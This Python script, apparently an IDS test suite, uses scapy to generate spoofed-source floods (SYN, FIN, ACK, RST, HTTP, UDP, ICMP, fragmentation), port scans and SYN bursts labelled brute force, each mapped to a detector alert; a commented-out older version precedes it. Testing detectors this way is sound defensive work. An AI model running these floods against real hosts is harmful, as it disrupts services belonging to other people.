# import argparse, time, random, socket, subprocess, re
# from scapy.all import IP, TCP, UDP, ICMP, Raw, Ether, sendp, fragment, conf, get_if_hwaddr
# conf.verb = 0
# IFACE = "wlan0"
# GW_MAC = None
# MY_MAC = None

# def rand_ip():
#     return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
# def rand_port():
#     return random.randint(1024, 65535)
# def status(msg):
#     print(f"  -> {msg}")

# def resolve_macs(iface, target):
#     global GW_MAC, MY_MAC
#     try:
#         MY_MAC = get_if_hwaddr(iface)
#         print(f"  Own MAC : {MY_MAC}")
#     except:
#         MY_MAC = "02:00:00:00:00:01"
#     subprocess.call(["ping","-c","1","-W","1",target], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
#     try:
#         out = subprocess.check_output(["arp","-n"], text=True)
#         for line in out.splitlines():
#             if target in line:
#                 m = re.search(r"([0-9a-f]{2}[:\-]){5}[0-9a-f]{2}", line, re.I)
#                 if m:
#                     GW_MAC = m.group(0)
#                     print(f"  Target MAC : {GW_MAC}")
#                     return
#     except:
#         pass
#     GW_MAC = "ff:ff:ff:ff:ff:ff"
#     print(f"  MAC : broadcast fallback")

# def xsend(pkt):
#     frame = Ether(src=MY_MAC, dst=GW_MAC) / pkt
#     sendp(frame, iface=IFACE, verbose=False)

# # ── ORIGINAL ATTACKS ──────────────────────────────────────
# def attack_fin_flood(target, duration=30, pps=300):
#     print(f"\n[2] TCP FIN Flood -> {target}")
#     status("FIN packets — bypasses SYN flood rule...")
#     end_time = time.time() + duration
#     count = 0
#     while time.time() < end_time:
#         xsend(IP(src=rand_ip(), dst=target) / TCP(sport=rand_port(), dport=rand_port(), flags="F"))
#         count += 1
#         if count % 500 == 0: status(f"Sent {count}...")
#         time.sleep(1.0/pps)
#     print(f"  [DONE] Sent {count} FIN packets.")

# def attack_ack_flood(target, duration=30, pps=300):
#     print(f"\n[3] TCP ACK Flood -> {target}")
#     status("ACK only — invisible to SYN rules...")
#     end_time = time.time() + duration
#     count = 0
#     while time.time() < end_time:
#         xsend(IP(src=rand_ip(), dst=target) / TCP(sport=rand_port(), dport=rand_port(), flags="A",
#               seq=random.randint(0,2**32-1), ack=random.randint(0,2**32-1)))
#         count += 1
#         if count % 500 == 0: status(f"Sent {count}...")
#         time.sleep(1.0/pps)
#     print(f"  [DONE] Sent {count} ACK packets.")

# def attack_fragmentation(target, count=300):
#     print(f"\n[4] IP Fragmentation Storm -> {target}")
#     status("Fragmented packets...")
#     for i in range(count):
#         pkt = IP(src=rand_ip(), dst=target) / UDP(sport=rand_port(), dport=rand_port()) / Raw(load="X"*random.randint(1000,3000))
#         for frag in fragment(pkt, fragsize=64): xsend(frag)
#         if i % 50 == 0: status(f"Sent {i}/{count}...")
#         time.sleep(0.02)
#     print(f"  [DONE] Sent {count} fragmented datagrams.")

# def attack_xmas_scan(target, ports=500):
#     print(f"\n[5] XMAS Scan -> {target}")
#     status("FIN+PSH+URG flags...")
#     src_ip = rand_ip()
#     for i, dport in enumerate(random.sample(range(1,65535), min(ports,65534))):
#         xsend(IP(src=src_ip, dst=target) / TCP(sport=rand_port(), dport=dport, flags="FPU"))
#         if i % 100 == 0: status(f"Scanned {i}/{ports}...")
#         time.sleep(0.005)
#     print(f"  [DONE] XMAS scanned {ports} ports.")

# def attack_null_scan(target, ports=500):
#     print(f"\n[6] NULL Scan -> {target}")
#     status("TCP flags=0...")
#     src_ip = rand_ip()
#     for i, dport in enumerate(random.sample(range(1,65535), min(ports,65534))):
#         xsend(IP(src=src_ip, dst=target) / TCP(sport=rand_port(), dport=dport, flags=0))
#         if i % 100 == 0: status(f"Scanned {i}/{ports}...")
#         time.sleep(0.005)
#     print(f"  [DONE] NULL scanned {ports} ports.")

# def attack_large_udp(target, duration=20, pps=100):
#     print(f"\n[7] Large UDP Flood -> {target}")
#     status("4-8KB UDP payloads...")
#     end_time = time.time() + duration
#     count = 0
#     dport = random.randint(1024, 9000)
#     while time.time() < end_time:
#         xsend(IP(src=rand_ip(), dst=target) / UDP(sport=rand_port(), dport=dport) / Raw(load="A"*random.randint(4096,8192)))
#         count += 1
#         time.sleep(1.0/pps)
#     print(f"  [DONE] Sent {count} large UDP packets.")

# def attack_low_and_slow(target, ports=100, delay=2.0):
#     print(f"\n[8] Low-and-Slow Recon -> {target}")
#     status("1 packet every 2s — under all thresholds...")
#     src_ip = rand_ip()
#     for i, dport in enumerate(random.sample(range(1,65535), min(ports,65534))):
#         xsend(IP(src=src_ip, dst=target) / TCP(sport=rand_port(), dport=dport, flags="S"))
#         if i % 10 == 0: status(f"Scanned {i}/{ports}...")
#         time.sleep(delay)
#     print(f"  [DONE] Scanned {ports} ports.")

# def attack_oversized_icmp(target, count=100):
#     print(f"\n[9] Oversized ICMP -> {target}")
#     status("Large ICMP payloads...")
#     for i in range(count):
#         pkt = IP(src=rand_ip(), dst=target) / ICMP() / Raw(load="P"*random.randint(5000,15000))
#         for f in fragment(pkt, fragsize=1480): xsend(f)
#         if i % 20 == 0: status(f"Sent {i}/{count}...")
#         time.sleep(0.1)
#     print(f"  [DONE] Sent {count} oversized ICMP.")

# def attack_dns_amplification(target, count=300):
#     print(f"\n[10] DNS Amplification -> {target}:53")
#     status("Many spoofed IPs to port 53...")
#     dns_query = b"\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\xff\x00\x01"
#     for i in range(count):
#         xsend(IP(src=rand_ip(), dst=target) / UDP(sport=rand_port(), dport=53) / Raw(load=dns_query))
#         if i % 50 == 0: status(f"Sent {i}/{count}...")
#         time.sleep(0.05)
#     print(f"  [DONE] Sent {count} DNS queries.")

# # ── BRUTE FORCE ATTACKS ───────────────────────────────────
# def attack_ssh_bruteforce(target, attempts=200):
#     print(f"\n[11] SSH Brute Force -> {target}:22 ({attempts} attempts)")
#     status("Rapid SYN to port 22 from one IP...")
#     src_ip = rand_ip()
#     for i in range(attempts):
#         xsend(IP(src=src_ip, dst=target) / TCP(sport=rand_port(), dport=22, flags="S"))
#         if i % 50 == 0: status(f"Attempt {i}/{attempts}...")
#         time.sleep(0.1)
#     print(f"  [DONE] Sent {attempts} SSH brute force packets.")

# def attack_ftp_bruteforce(target, attempts=200):
#     print(f"\n[12] FTP Brute Force -> {target}:21 ({attempts} attempts)")
#     status("Rapid SYN to port 21...")
#     src_ip = rand_ip()
#     for i in range(attempts):
#         xsend(IP(src=src_ip, dst=target) / TCP(sport=rand_port(), dport=21, flags="S"))
#         if i % 50 == 0: status(f"Attempt {i}/{attempts}...")
#         time.sleep(0.1)
#     print(f"  [DONE] Sent {attempts} FTP brute force packets.")

# def attack_http_flood(target, duration=30, pps=200):
#     print(f"\n[13] HTTP Flood -> {target}:80 ({pps} pps, {duration}s)")
#     status("Simulated HTTP GET flood from many IPs...")
#     http_payload = (
#         b"GET / HTTP/1.1\r\nHost: target.com\r\n"
#         b"User-Agent: Mozilla/5.0\r\nAccept: */*\r\n"
#         b"Connection: keep-alive\r\n\r\n"
#     )
#     end_time = time.time() + duration
#     count = 0
#     while time.time() < end_time:
#         xsend(IP(src=rand_ip(), dst=target) /
#               TCP(sport=rand_port(), dport=80, flags="PA", seq=random.randint(0,2**32-1)) /
#               Raw(load=http_payload))
#         count += 1
#         if count % 500 == 0: status(f"Sent {count}...")
#         time.sleep(1.0/pps)
#     print(f"  [DONE] Sent {count} HTTP flood packets.")

# def attack_credential_stuffing(target, attempts=300):
#     print(f"\n[14] Credential Stuffing -> {target}:443 ({attempts} attempts)")
#     status("Many different IPs to port 443 — automated login simulation...")
#     for i in range(attempts):
#         xsend(IP(src=rand_ip(), dst=target) / TCP(sport=rand_port(), dport=443, flags="S"))
#         if i % 50 == 0: status(f"Attempt {i}/{attempts}...")
#         time.sleep(0.05)
#     print(f"  [DONE] Sent {attempts} credential stuffing packets.")

# def attack_rdp_bruteforce(target, attempts=200):
#     print(f"\n[15] RDP Brute Force -> {target}:3389 ({attempts} attempts)")
#     status("Rapid SYN to port 3389 (Remote Desktop)...")
#     src_ip = rand_ip()
#     for i in range(attempts):
#         xsend(IP(src=src_ip, dst=target) / TCP(sport=rand_port(), dport=3389, flags="S"))
#         if i % 50 == 0: status(f"Attempt {i}/{attempts}...")
#         time.sleep(0.08)
#     print(f"  [DONE] Sent {attempts} RDP brute force packets.")

# def attack_telnet_bruteforce(target, attempts=200):
#     print(f"\n[16] Telnet Brute Force -> {target}:23 ({attempts} attempts)")
#     status("Rapid SYN to port 23 (Telnet)...")
#     src_ip = rand_ip()
#     for i in range(attempts):
#         xsend(IP(src=src_ip, dst=target) / TCP(sport=rand_port(), dport=23, flags="S"))
#         if i % 50 == 0: status(f"Attempt {i}/{attempts}...")
#         time.sleep(0.08)
#     print(f"  [DONE] Sent {attempts} Telnet brute force packets.")

# def attack_rst_flood(target, duration=20, pps=200):
#     print(f"\n[17] TCP RST Flood -> {target} ({pps} pps, {duration}s)")
#     status("RST packets — kills existing connections...")
#     end_time = time.time() + duration
#     count = 0
#     while time.time() < end_time:
#         xsend(IP(src=rand_ip(), dst=target) /
#               TCP(sport=rand_port(), dport=rand_port(), flags="R", seq=random.randint(0,2**32-1)))
#         count += 1
#         if count % 500 == 0: status(f"Sent {count}...")
#         time.sleep(1.0/pps)
#     print(f"  [DONE] Sent {count} RST packets.")

# def attack_smtp_bruteforce(target, attempts=200):
#     print(f"\n[18] SMTP Brute Force -> {target}:25 ({attempts} attempts)")
#     status("Rapid SYN to port 25 (email server)...")
#     src_ip = rand_ip()
#     for i in range(attempts):
#         xsend(IP(src=src_ip, dst=target) / TCP(sport=rand_port(), dport=25, flags="S"))
#         if i % 50 == 0: status(f"Attempt {i}/{attempts}...")
#         time.sleep(0.08)
#     print(f"  [DONE] Sent {attempts} SMTP brute force packets.")

# def attack_mysql_bruteforce(target, attempts=200):
#     print(f"\n[19] MySQL Brute Force -> {target}:3306 ({attempts} attempts)")
#     status("Rapid SYN to port 3306 (MySQL database)...")
#     src_ip = rand_ip()
#     for i in range(attempts):
#         xsend(IP(src=src_ip, dst=target) / TCP(sport=rand_port(), dport=3306, flags="S"))
#         if i % 50 == 0: status(f"Attempt {i}/{attempts}...")
#         time.sleep(0.08)
#     print(f"  [DONE] Sent {attempts} MySQL brute force packets.")

# def attack_port_knocking(target):
#     print(f"\n[20] Port Knocking Probe -> {target}")
#     status("Secret port sequence to discover hidden services...")
#     src_ip = rand_ip()
#     for port in [7000, 8000, 9000, 7001, 8001]:
#         xsend(IP(src=src_ip, dst=target) / TCP(sport=rand_port(), dport=port, flags="S"))
#         status(f"Knocked port {port}")
#         time.sleep(0.5)
#     print(f"  [DONE] Port knocking sequence sent.")

# # ── ATTACK TABLE ──────────────────────────────────────────
# ATTACKS = {
#     "2":  ("TCP FIN Flood",             attack_fin_flood),
#     "3":  ("TCP ACK Flood",             attack_ack_flood),
#     "4":  ("IP Fragmentation Storm",    attack_fragmentation),
#     "5":  ("XMAS Scan",                 attack_xmas_scan),
#     "6":  ("NULL Scan",                 attack_null_scan),
#     "7":  ("Large UDP Flood",           attack_large_udp),
#     "8":  ("Low-and-Slow Recon",        attack_low_and_slow),
#     "9":  ("Oversized ICMP",            attack_oversized_icmp),
#     "10": ("DNS Amplification Sim",     attack_dns_amplification),
#     "11": ("SSH Brute Force",           attack_ssh_bruteforce),
#     "12": ("FTP Brute Force",           attack_ftp_bruteforce),
#     "13": ("HTTP Flood",                attack_http_flood),
#     "14": ("Credential Stuffing",       attack_credential_stuffing),
#     "15": ("RDP Brute Force",           attack_rdp_bruteforce),
#     "16": ("Telnet Brute Force",        attack_telnet_bruteforce),
#     "17": ("TCP RST Flood",             attack_rst_flood),
#     "18": ("SMTP Brute Force",          attack_smtp_bruteforce),
#     "19": ("MySQL Brute Force",         attack_mysql_bruteforce),
#     "20": ("Port Knocking Probe",       attack_port_knocking),
# }

# BRUTE_FORCE_GROUP = ["11","12","14","15","16","18","19"]

# if __name__ == "__main__":
#     parser = argparse.ArgumentParser(description="Zero-Day IDS Test Suite")
#     parser.add_argument("--target", default=None)
#     parser.add_argument("--attack", required=True,
#                         help="2-20, 'all', 'bruteforce', or 'list'")
#     parser.add_argument("--iface", default="wlan0")
#     args = parser.parse_args()
#     IFACE = args.iface
#     conf.iface = args.iface

#     if args.attack == "list":
#         print("\nAvailable attacks:")
#         for num,(name,_) in ATTACKS.items():
#             print(f"  [{num:>2}] {name}")
#         print()
#         exit(0)

#     if not args.target:
#         print("Error: --target required. e.g. --target 172.20.10.2")
#         exit(1)

#     print("\n" + "="*60)
#     print(f"  Target: {args.target}  Attack: {args.attack}  Iface: {args.iface}")
#     print("  WARNING: Only use on networks you own/control.")
#     print("="*60)
#     print("\n  Resolving MACs...")
#     resolve_macs(args.iface, args.target)
#     print()

#     if args.attack == "bruteforce":
#         print("  Running all brute force attacks...\n")
#         for num in BRUTE_FORCE_GROUP:
#             ATTACKS[num][1](args.target)
#             print("  Waiting 5s...")
#             time.sleep(5)

#     elif args.attack == "all":
#         for num,(name,func) in ATTACKS.items():
#             if num == "8":
#                 print(f"\n[8] Skipping '{name}' (too slow). Run separately.")
#                 continue
#             func(args.target)
#             print("  Waiting 5s..."); time.sleep(5)

#     elif args.attack in ATTACKS:
#         ATTACKS[args.attack][1](args.target)

#     else:
#         print(f"Unknown attack '{args.attack}'. Use --attack list.")
#         exit(1)

#     print("\n" + "="*60)
#     print("  Done. Check http://127.0.0.1:8090/attacks for alerts.")
#     print("="*60)



"""
test_attacks.py — Known Attack Test Suite
==========================================
Tests rule-based detectors in main.py.

Each attack is designed to trigger a SPECIFIC named rule:
  FIN_FLOOD, ACK_FLOOD, RST_FLOOD, HTTP_FLOOD,
  XMAS_SCAN, NULL_SCAN, PORT_SCAN, UDP_SCAN,
  BRUTE_FORCE (SSH/FTP/RDP/Telnet/SMTP/MySQL),
  CREDENTIAL_STUFFING, DoS

Usage:
  sudo $(which python) test_attacks.py --target 172.20.10.2 --attack list
  sudo $(which python) test_attacks.py --target 172.20.10.2 --attack 2  --iface wlan0
  sudo $(which python) test_attacks.py --target 172.20.10.2 --attack all --iface wlan0
  sudo $(which python) test_attacks.py --target 172.20.10.2 --attack bruteforce --iface wlan0
  sudo $(which python) test_attacks.py --target 172.20.10.2 --attack floods --iface wlan0
  sudo $(which python) test_attacks.py --target 172.20.10.2 --attack scans --iface wlan0

WARNING: Only run on systems and networks you own and control.
"""

import argparse
import time
import random
import subprocess
import re
from scapy.all import (
    IP, TCP, UDP, ICMP, Raw, Ether,
    sendp, fragment, conf, get_if_hwaddr
)
conf.verb = 0

# Globals set from --iface argument
IFACE  = "wlan0"
GW_MAC = None
MY_MAC = None


# =============================================================================
# HELPERS
# =============================================================================

def rand_ip():
    """Generate a random non-reserved IP for spoofing."""
    return (f"{random.randint(1,254)}.{random.randint(1,254)}."
            f"{random.randint(1,254)}.{random.randint(1,254)}")

def rand_port():
    return random.randint(1024, 65535)

def status(msg):
    print(f"  -> {msg}")

def resolve_macs(iface, target):
    """Resolve our MAC and target MAC for Layer-2 sending."""
    global GW_MAC, MY_MAC
    try:
        MY_MAC = get_if_hwaddr(iface)
        print(f"  Own MAC    : {MY_MAC}")
    except Exception:
        MY_MAC = "02:00:00:00:00:01"
        print(f"  Own MAC    : fallback {MY_MAC}")
    # Ping to populate ARP cache
    subprocess.call(["ping", "-c", "1", "-W", "1", target],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        out = subprocess.check_output(["arp", "-n"], text=True)
        for line in out.splitlines():
            if target in line:
                m = re.search(r"([0-9a-f]{2}[:\-]){5}[0-9a-f]{2}", line, re.I)
                if m:
                    GW_MAC = m.group(0)
                    print(f"  Target MAC : {GW_MAC}")
                    return
    except Exception:
        pass
    GW_MAC = "ff:ff:ff:ff:ff:ff"
    print("  Target MAC : broadcast fallback")

def xsend(pkt):
    """
    Layer-2 send using a real Ethernet frame.
    Avoids scapy MAC resolution failures that stop after ~15 packets.
    """
    sendp(Ether(src=MY_MAC, dst=GW_MAC) / pkt, iface=IFACE, verbose=False)

def print_header(num, name, target, extra=""):
    print(f"\n{'='*55}")
    print(f"  [{num}] {name}")
    print(f"  Target : {target}  {extra}")
    print(f"  Expected alert in main.py : see comment above function")
    print(f"{'='*55}")


# =============================================================================
# ── FLOOD ATTACKS ─────────────────────────────────────────────────────────────
# =============================================================================

def attack_fin_flood(target, duration=30, pps=300):
    """
    Expected alert : FIN_FLOOD
    How            : Sends bare FIN packets (no ACK/SYN) at 300 pps.
                     main.py detects is_pure_fin pps > FIN_FLOOD_THRESHOLD(150)
    """
    print_header(2, "TCP FIN Flood", target, f"pps={pps}  duration={duration}s")
    status("Bare FIN — no ACK/SYN → triggers FIN_FLOOD rule")
    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        xsend(IP(src=rand_ip(), dst=target) /
              TCP(sport=rand_port(), dport=rand_port(), flags="F"))
        count += 1
        if count % 500 == 0:
            status(f"Sent {count} packets...")
        time.sleep(1.0 / pps)
    print(f"  [DONE] Sent {count} FIN packets.")


def attack_ack_flood(target, duration=30, pps=300):
    """
    Expected alert : ACK_FLOOD
    How            : Sends pure ACK (no SYN/PSH/RST/FIN) at 300 pps.
                     main.py detects is_ack_only pps > ACK_FLOOD_THRESHOLD(150)
    """
    print_header(3, "TCP ACK Flood", target, f"pps={pps}  duration={duration}s")
    status("Pure ACK only — no SYN/PSH → triggers ACK_FLOOD rule")
    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        xsend(IP(src=rand_ip(), dst=target) /
              TCP(sport=rand_port(), dport=rand_port(), flags="A",
                  seq=random.randint(0, 2**32 - 1),
                  ack=random.randint(0, 2**32 - 1)))
        count += 1
        if count % 500 == 0:
            status(f"Sent {count} packets...")
        time.sleep(1.0 / pps)
    print(f"  [DONE] Sent {count} ACK packets.")


def attack_rst_flood(target, duration=20, pps=200):
    """
    Expected alert : RST_FLOOD
    How            : Sends bare RST packets at 200 pps.
                     main.py detects is_pure_rst pps > RST_FLOOD_THRESHOLD(150)
    """
    print_header(17, "TCP RST Flood", target, f"pps={pps}  duration={duration}s")
    status("Bare RST packets → triggers RST_FLOOD rule")
    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        xsend(IP(src=rand_ip(), dst=target) /
              TCP(sport=rand_port(), dport=rand_port(), flags="R",
                  seq=random.randint(0, 2**32 - 1)))
        count += 1
        if count % 500 == 0:
            status(f"Sent {count} packets...")
        time.sleep(1.0 / pps)
    print(f"  [DONE] Sent {count} RST packets.")


def attack_http_flood(target, duration=30, pps=200):
    """
    Expected alert : HTTP_FLOOD
    How            : Sends PSH+ACK HTTP payloads to port 80 at 200 pps.
                     main.py detects is_psh_ack + dport in HTTP_PORTS
                     pps > HTTP_FLOOD_THRESHOLD(150)
    """
    print_header(13, "HTTP Flood", target, f"pps={pps}  duration={duration}s  port=80")
    status("PSH+ACK with HTTP payload to port 80 → triggers HTTP_FLOOD rule")
    payload = (b"GET / HTTP/1.1\r\nHost: target.com\r\n"
               b"User-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n")
    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        xsend(IP(src=rand_ip(), dst=target) /
              TCP(sport=rand_port(), dport=80, flags="PA",
                  seq=random.randint(0, 2**32 - 1)) /
              Raw(load=payload))
        count += 1
        if count % 500 == 0:
            status(f"Sent {count} packets...")
        time.sleep(1.0 / pps)
    print(f"  [DONE] Sent {count} HTTP flood packets.")


def attack_syn_flood(target, duration=15, pps=600):
    """
    Expected alert : DoS SYN_FLOOD
    How            : Sends pure SYN at 600 pps (> DOS_PPS_THRESHOLD=500).
                     main.py detects is_syn pps > DOS_PPS_THRESHOLD
    """
    print_header("DoS", "SYN Flood (DoS)", target, f"pps={pps}  duration={duration}s")
    status("Pure SYN at 600 pps → triggers DoS SYN_FLOOD rule")
    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        xsend(IP(src=rand_ip(), dst=target) /
              TCP(sport=rand_port(), dport=rand_port(), flags="S"))
        count += 1
        if count % 1000 == 0:
            status(f"Sent {count} packets...")
        time.sleep(1.0 / pps)
    print(f"  [DONE] Sent {count} SYN packets.")


# =============================================================================
# ── SCAN ATTACKS ──────────────────────────────────────────────────────────────
# =============================================================================

def attack_syn_scan(target, ports=500):
    """
    Expected alert : PORT_SCAN
    How            : Sends SYN to 500 different ports from one IP.
                     main.py detects unique dports >= PORT_SCAN_THRESHOLD(30)
    """
    print_header(1, "SYN Port Scan", target, f"ports={ports}")
    status("SYN to 500 unique ports → triggers PORT_SCAN rule")
    src_ip = rand_ip()
    for i, dport in enumerate(random.sample(range(1, 65535), min(ports, 65534))):
        xsend(IP(src=src_ip, dst=target) /
              TCP(sport=rand_port(), dport=dport, flags="S"))
        if i % 100 == 0:
            status(f"Scanned {i}/{ports} ports...")
        time.sleep(0.005)
    print(f"  [DONE] SYN scanned {ports} ports.")


def attack_xmas_scan(target, ports=500):
    """
    Expected alert : XMAS_SCAN
    How            : Sends FIN+PSH+URG to 500 different ports from one IP.
                     main.py detects is_xmas unique dports >= XMAS_SCAN_THRESHOLD(20)
    """
    print_header(5, "XMAS Scan", target, f"ports={ports}")
    status("FIN+PSH+URG to 500 ports → triggers XMAS_SCAN rule")
    src_ip = rand_ip()
    for i, dport in enumerate(random.sample(range(1, 65535), min(ports, 65534))):
        xsend(IP(src=src_ip, dst=target) /
              TCP(sport=rand_port(), dport=dport, flags="FPU"))
        if i % 100 == 0:
            status(f"Scanned {i}/{ports} ports...")
        time.sleep(0.005)
    print(f"  [DONE] XMAS scanned {ports} ports.")


def attack_null_scan(target, ports=500):
    """
    Expected alert : NULL_SCAN
    How            : Sends TCP flags=0 to 500 different ports from one IP.
                     main.py detects is_null unique dports >= NULL_SCAN_THRESHOLD(20)
    """
    print_header(6, "NULL Scan", target, f"ports={ports}")
    status("TCP flags=0 to 500 ports → triggers NULL_SCAN rule")
    src_ip = rand_ip()
    for i, dport in enumerate(random.sample(range(1, 65535), min(ports, 65534))):
        xsend(IP(src=src_ip, dst=target) /
              TCP(sport=rand_port(), dport=dport, flags=0))
        if i % 100 == 0:
            status(f"Scanned {i}/{ports} ports...")
        time.sleep(0.005)
    print(f"  [DONE] NULL scanned {ports} ports.")


def attack_udp_scan(target, ports=400):
    """
    Expected alert : UDP_SCAN
    How            : Sends UDP to 400 different ports from one IP.
                     main.py detects unique udp dports >= UDP_SCAN_THRESHOLD(20)
    """
    print_header("US", "UDP Scan", target, f"ports={ports}")
    status("UDP to 400 unique ports → triggers UDP_SCAN rule")
    src_ip = rand_ip()
    for i, dport in enumerate(random.sample(range(1, 65535), min(ports, 65534))):
        xsend(IP(src=src_ip, dst=target) /
              UDP(sport=rand_port(), dport=dport) /
              Raw(load=b"\x00" * 10))
        if i % 100 == 0:
            status(f"Scanned {i}/{ports} ports...")
        time.sleep(0.005)
    print(f"  [DONE] UDP scanned {ports} ports.")


# =============================================================================
# ── BRUTE FORCE ATTACKS ───────────────────────────────────────────────────────
# =============================================================================

def _brute_force(target, port, service, attempts=200, delay=0.08):
    """
    Expected alert : BRUTE_FORCE  SERVICE=<service>  PORT=<port>
    How            : Sends >= 30 SYN to same port within 60s from one IP.
                     main.py detects attempts >= BRUTE_FORCE_THRESHOLD(30)
    """
    print_header("BF", f"{service} Brute Force", target,
                 f"port={port}  attempts={attempts}")
    status(f"SYN to port {port} ({service}) from one IP → triggers BRUTE_FORCE rule")
    src_ip = rand_ip()
    for i in range(attempts):
        xsend(IP(src=src_ip, dst=target) /
              TCP(sport=rand_port(), dport=port, flags="S"))
        if i % 50 == 0:
            status(f"Attempt {i}/{attempts}...")
        time.sleep(delay)
    print(f"  [DONE] Sent {attempts} {service} brute force packets.")


def attack_ssh_bruteforce(target):
    _brute_force(target, 22,    "SSH",        attempts=200, delay=0.10)

def attack_ftp_bruteforce(target):
    _brute_force(target, 21,    "FTP",        attempts=200, delay=0.10)

def attack_rdp_bruteforce(target):
    _brute_force(target, 3389,  "RDP",        attempts=200, delay=0.08)

def attack_telnet_bruteforce(target):
    _brute_force(target, 23,    "Telnet",     attempts=200, delay=0.08)

def attack_smtp_bruteforce(target):
    _brute_force(target, 25,    "SMTP",       attempts=200, delay=0.08)

def attack_mysql_bruteforce(target):
    _brute_force(target, 3306,  "MySQL",      attempts=200, delay=0.08)

def attack_redis_bruteforce(target):
    _brute_force(target, 6379,  "Redis",      attempts=200, delay=0.08)

def attack_postgres_bruteforce(target):
    _brute_force(target, 5432,  "PostgreSQL", attempts=200, delay=0.08)


# =============================================================================
# ── CREDENTIAL STUFFING ───────────────────────────────────────────────────────
# =============================================================================

def attack_credential_stuffing(target, attempts=300):
    """
    Expected alert : CREDENTIAL_STUFFING
    How            : Sends 300 SYN to port 443 from 300 DIFFERENT spoofed IPs.
                     main.py detects unique source IPs >= CRED_STUFF_SRC_THRESHOLD(200)
                     Note: different from brute force (one IP) — this is MANY IPs
    """
    print_header(14, "Credential Stuffing", target,
                 f"port=443  unique_srcs={attempts}")
    status("300 DIFFERENT spoofed IPs to port 443 → triggers CREDENTIAL_STUFFING rule")
    status("(Different from brute force — many IPs, not one IP)")
    for i in range(attempts):
        # Each packet uses a completely different source IP
        xsend(IP(src=rand_ip(), dst=target) /
              TCP(sport=rand_port(), dport=443, flags="S"))
        if i % 50 == 0:
            status(f"Attempt {i}/{attempts} (unique IPs)...")
        time.sleep(0.05)
    print(f"  [DONE] Sent {attempts} credential stuffing packets.")


# =============================================================================
# ATTACK TABLE
# =============================================================================
ATTACKS = {
    # Floods
    "syn":  ("SYN Flood (DoS)",         attack_syn_flood),
    "2":    ("TCP FIN Flood",            attack_fin_flood),
    "3":    ("TCP ACK Flood",            attack_ack_flood),
    "13":   ("HTTP Flood",               attack_http_flood),
    "17":   ("TCP RST Flood",            attack_rst_flood),
    # Scans
    "1":    ("SYN Port Scan",            attack_syn_scan),
    "5":    ("XMAS Scan",                attack_xmas_scan),
    "6":    ("NULL Scan",                attack_null_scan),
    "udp":  ("UDP Scan",                 attack_udp_scan),
    # Brute force
    "11":   ("SSH Brute Force",          attack_ssh_bruteforce),
    "12":   ("FTP Brute Force",          attack_ftp_bruteforce),
    "15":   ("RDP Brute Force",          attack_rdp_bruteforce),
    "16":   ("Telnet Brute Force",       attack_telnet_bruteforce),
    "18":   ("SMTP Brute Force",         attack_smtp_bruteforce),
    "19":   ("MySQL Brute Force",        attack_mysql_bruteforce),
    "20":   ("Redis Brute Force",        attack_redis_bruteforce),
    "21":   ("PostgreSQL Brute Force",   attack_postgres_bruteforce),
    # Credential stuffing
    "14":   ("Credential Stuffing",      attack_credential_stuffing),
}

FLOOD_GROUP     = ["syn", "2", "3", "13", "17"]
SCAN_GROUP      = ["1", "5", "6", "udp"]
BRUTEFORCE_GROUP = ["11", "12", "15", "16", "18", "19", "20", "21"]


# =============================================================================
# MAIN
# =============================================================================
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Known Attack Test Suite — tests rule-based detectors in main.py"
    )
    parser.add_argument("--target",  default=None,
                        help="Target IP  e.g. 172.20.10.2")
    parser.add_argument("--attack",  required=True,
                        help=("Attack number/name, or group: "
                              "all | floods | scans | bruteforce | list"))
    parser.add_argument("--iface",   default="wlan0",
                        help="Network interface  e.g. wlan0, eth0")
    args = parser.parse_args()

    IFACE      = args.iface
    conf.iface = args.iface

    # ── List mode ────────────────────────────────────────────
    if args.attack == "list":
        print("\n  Known Attack Test Suite — Available Attacks")
        print("  " + "-"*50)
        print(f"  {'Key':<8} {'Name':<30} {'Expected Alert'}")
        print("  " + "-"*50)
        alerts = {
            "syn":  "DoS SYN_FLOOD",
            "2":    "FIN_FLOOD",
            "3":    "ACK_FLOOD",
            "13":   "HTTP_FLOOD",
            "17":   "RST_FLOOD",
            "1":    "PORT_SCAN",
            "5":    "XMAS_SCAN",
            "6":    "NULL_SCAN",
            "udp":  "UDP_SCAN",
            "11":   "BRUTE_FORCE SSH",
            "12":   "BRUTE_FORCE FTP",
            "15":   "BRUTE_FORCE RDP",
            "16":   "BRUTE_FORCE Telnet",
            "18":   "BRUTE_FORCE SMTP",
            "19":   "BRUTE_FORCE MySQL",
            "20":   "BRUTE_FORCE Redis",
            "21":   "BRUTE_FORCE PostgreSQL",
            "14":   "CREDENTIAL_STUFFING",
        }
        for key, (name, _) in ATTACKS.items():
            print(f"  {key:<8} {name:<30} {alerts.get(key,'')}")
        print()
        print("  Groups:  floods | scans | bruteforce | all")
        print()
        raise SystemExit(0)

    if not args.target:
        print("Error: --target required.  e.g. --target 172.20.10.2")
        raise SystemExit(1)

    print("\n" + "="*60)
    print("  Known Attack Test Suite")
    print("="*60)
    print(f"  Target    : {args.target}")
    print(f"  Attack    : {args.attack}")
    print(f"  Interface : {args.iface}")
    print("  WARNING   : Only use on networks you own and control.")
    print("="*60)
    print("\n  Resolving MACs...")
    resolve_macs(args.iface, args.target)
    print()

    def run_group(keys):
        for key in keys:
            name, func = ATTACKS[key]
            func(args.target)
            print(f"\n  Waiting 5s before next attack...")
            time.sleep(5)

    if args.attack == "floods":
        print("  Running all flood attacks...\n")
        run_group(FLOOD_GROUP)

    elif args.attack == "scans":
        print("  Running all scan attacks...\n")
        run_group(SCAN_GROUP)

    elif args.attack == "bruteforce":
        print("  Running all brute force attacks...\n")
        run_group(BRUTEFORCE_GROUP)

    elif args.attack == "all":
        print("  Running ALL known attacks...\n")
        run_group(list(ATTACKS.keys()))

    elif args.attack in ATTACKS:
        ATTACKS[args.attack][1](args.target)

    else:
        print(f"  Unknown attack '{args.attack}'.")
        print("  Use --attack list  to see all options.")
        raise SystemExit(1)

    print("\n" + "="*60)
